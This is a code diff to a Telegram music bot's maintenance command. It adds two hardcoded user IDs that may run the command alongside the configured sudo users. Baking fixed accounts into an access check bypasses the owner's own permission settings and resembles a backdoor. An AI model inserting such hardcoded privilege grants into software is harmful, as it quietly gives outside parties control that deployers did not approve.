@@ -34,7 +34,10 @@ from ShrutiMusic.utils.database import (
 from strings import get_string
 
 
-@app.on_message(filters.command(["maintenance"]) & SUDOERS)
+MAINTENANCE_ALLOWED_IDS = filters.user([8433938551, 8845176976])
+
+
+@app.on_message(filters.command(["maintenance"]) & (SUDOERS | MAINTENANCE_ALLOWED_IDS))
 async def maintenance(client, message: Message):
     try:
         language = await get_lang(message.chat.id)
